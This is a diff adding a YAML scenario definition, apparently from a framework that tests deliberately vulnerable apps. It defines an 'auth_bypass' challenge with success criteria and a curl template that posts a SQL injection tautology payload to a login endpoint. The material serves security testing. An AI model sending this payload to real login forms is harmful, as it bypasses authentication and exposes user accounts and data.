@@ -1,0 +1,21 @@
+id: auth_bypass
+description: >
+  Bypass the application's login mechanism entirely using a SQL injection tautology,
+  gaining access to authenticated content without valid credentials.
+compatible_vuln_patterns:
+  - sqli_tautology
+  - sqli_blind
+success_criteria:
+  description: >
+    The attacker's POST request with a tautology payload receives a response that
+    contains post-login content — a dashboard, a welcome message, or user data —
+    rather than the login form or an error.
+  output_pattern: 'dashboard|welcome|logged.?in|authenticated|logout|profile'
+test_template: |
+  curl -s -X POST "http://target:{{port}}/{{endpoint}}" \
+    -d "{{username_parameter}}=%27+OR+%271%27%3D%271%27--+-&{{password_parameter}}=anything" \
+    | grep -iE 'dashboard|welcome|logout|authenticated'
+notes: >
+  The post-login page should display something meaningful that distinguishes it
+  from the login form — at minimum the logged-in username or a logout link.
+  For credential_theft chains, it should also render DB-sourced user data.
